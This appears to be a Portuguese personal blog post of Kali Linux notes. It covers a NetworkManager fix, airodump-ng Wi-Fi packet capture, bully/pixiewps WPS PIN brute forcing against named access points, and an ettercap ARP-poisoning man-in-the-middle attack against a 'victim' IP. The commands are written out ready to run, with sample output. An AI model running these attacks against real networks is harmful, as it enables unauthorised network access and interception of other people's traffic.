---
title: "Kali"
date: 2019-01-01T00:00:00-03:00
last_modified_at: 2023-11-25T00:00:00-03:00
excerpt_separator: "<!--more-->"
categories:
  - IT
  - Hacks
tags:
  - firma
---

## _Bugs_

Em novembro de 2023 notei que o Kali não encontrava as redes. Lendo o _post_ [kali linux doesn't detect wireless networks](https://superuser.com/questions/892652/kali-linux-doesnt-detect-wireless-networks)

```shell
sudo nano /etc/NetworkManager/NetworkManager.conf
```

<br>

Alterar para..

```shell
[ifupdown]
managed=true
```

<br>

---

## Sniffing

```bash
# Vê os pacotes entre roteadores e devices
sudo airdump-ng wlan0mon

# Captura Pacotes
sudo airodump-ng --bssid {mac_address} --channel {channel number} --write {filename}  wlan0mon
sudo airodump-ng --bssid 90:F6:52:F0:C5:B4 --channel 1 --write my_network wlan0mon

# Abre os pacotes no Wireshark
```

<br>

---

## Bully

```bash
# Associação
sudo bully --bssid D8:C6:78:0F:73:14 --essid VIVO-7314 --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
#[!] Received disassociation/deauthentication from the AP
#[+] Rx(  M1  ) = 'EAPFail'   Next pin '20075361'

# Mi 8 Lite
sudo bully --bssid 5E:8F:53:F6:37:D0 --essid "MI 8 Lite" --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
```

<br>

---

## ARP Poison

[How Hackers SNiFF (capture) network traffic // MiTM attack](https://www.youtube.com/watch?v=-rSqbgI7oZM)

```bash
# Scan network looking for devices
sudo nmap -sn 192.168.0.1/24

# Man-in-the-Middle (MiTM) attack
sudo ettercap -T -S -i {interface} -M arp:remote /{ip router}// /{ip vítima}//
sudo ettercap -T -S -i wlan0mon -M arp:remote /192.168.0.1// /192.168.0.110//
#-T	text-only
#-S	no use ssl

# After capture using wireshark
sudo wireshark
```
